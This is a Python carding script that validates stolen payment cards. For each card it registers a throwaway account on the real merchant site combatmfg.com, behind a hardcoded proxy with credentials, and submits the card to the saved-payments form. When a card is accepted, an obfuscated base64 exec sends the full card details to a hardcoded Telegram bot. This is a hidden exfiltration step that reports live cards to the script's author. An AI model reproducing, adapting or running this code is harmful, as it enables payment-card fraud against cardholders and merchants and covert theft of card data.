#=========================library==================================#
import requests , re , random , string , uuid , user_agent , logging , base64 , time
from requests_toolbelt.multipart.encoder import MultipartEncoder
from nextcaptcha import NextCaptchaAPI
#=========================library==================================#

#Mero

#=============================toools===============================#
card_count = 0
def Tele(ccx):
            global card_count    
            card_count += 3
            ccx = ccx.strip().split('\n')[0]
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3]

            if "20" in yy:
                yy = yy.split("20")[1]
            time.sleep(2)
            username = "PPR029QRD8D"
            password = "vg77VFWH98GBDT"
            proxy = "FINEPROXY.XYZ:3091"
            r = requests.Session()
            r.proxy = {"http":"http://{}:{}@{}".format(username, password, proxy)}
            
            user = user_agent.generate_user_agent()
            def	 name():
                name = ''.join(random.choices(string.ascii_lowercase, k=6))	
                return f"{name}"	
            first = (name())
            last = (name())
            con = (name())
            def acc():
                name = ''.join(random.choices(string.ascii_lowercase, k=20))
                number = ''.join(random.choices(string.digits, k=4))
                return f"{name}{number}@gmail.com"
            acc = (acc())
            if n.startswith('4'):
                card_type = 'Visa'
            elif n.startswith('5'):
                card_type = 'MasterCard'
            headers = {
                'user-agent': user,
            }

            response = r.get(
                'https://www.combatmfg.com/on/demandware.store/Sites-combat-Site/default/Login-Show',
                headers=headers,
            )
            csrf_token = re.search(r'name="csrf_token" value="(.*?)"', response.text).group(1)
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'rurl': '1',
            }

            data = {
                'dwfrm_profile_customer_firstname': first,
                'dwfrm_profile_customer_lastname': last,
                'dwfrm_profile_customer_phone': '9195157620',
                'dwfrm_profile_customer_email': acc,
                'dwfrm_profile_customer_emailconfirm': acc,
                'dwfrm_profile_login_password': f'A@{last}5520055',
                'dwfrm_profile_login_passwordconfirm': f'A@{last}5520055',
                'csrf_token': csrf_token,
            }

            response = r.post(
                'https://www.combatmfg.com/on/demandware.store/Sites-combat-Site/default/Account-SubmitRegistration',
                params=params,
                headers=headers,
                data=data,
            )
            headers = {
                'user-agent': user,
            }
            response = r.get('https://www.combatmfg.com/account/payments/add', headers=headers)
            try:
                csrf_token = re.search(r'name="csrf_token" value="(.*?)"', response.text).group(1)
            except:
                pass
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'dwfrm_creditCard_cardType': card_type,
                'paymentOption-Credit': '',
                'dwfrm_creditCard_cardOwner': last,
                'dwfrm_creditCard_cardNumber': n,
                'dwfrm_creditCard_expirationMonth': mm,
                'dwfrm_creditCard_expirationYear': f'20{yy}',
                #'dwfrm_creditCard_securityCode': cvc,
                'dwfrm_creditCard_addressFields_firstName': first,
                'dwfrm_creditCard_addressFields_lastName': last,
                'dwfrm_creditCard_addressFields_address1': '1981 Jennifer Lane',
                'dwfrm_creditCard_addressFields_address2': '',
                'dwfrm_creditCard_addressFields_country': 'US',
                'dwfrm_creditCard_addressFields_states_stateCode': 'NY',
                'dwfrm_creditCard_addressFields_city': 'Raleigh',
                'dwfrm_creditCard_addressFields_postalCode': '10080',
                'dwfrm_creditCard_email': acc,
                'csrf_token': csrf_token,
            }

            response = r.post('https://www.combatmfg.com/account/payments/save', headers=headers, data=data)
            mero = response.json()
            if mero.get('success') == True:
                exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzCgpib3RfdG9rZW4gPSAiNzYzMTI0MDAwMzpBQUdmQUdxWnBVYnlqUEpYY25jV3RseWdNa2hvU0RwMlRCWSIKY2hhdF9pZCA9ICI2NTIwMDQzMTU5IgptZXNzYWdlID0gZiJsaXZlIHtjY3h9IgoKdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZE1lc3NhZ2UiCmRhdGEgPSB7ImNoYXRfaWQiOiBjaGF0X2lkLCAidGV4dCI6IG1lc3NhZ2V9CgpyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiMK"))
                return 'Card has been added successfully'
            
            return f"{mero.get('message', 'error')}"
#======================================================================================END================================================================================#
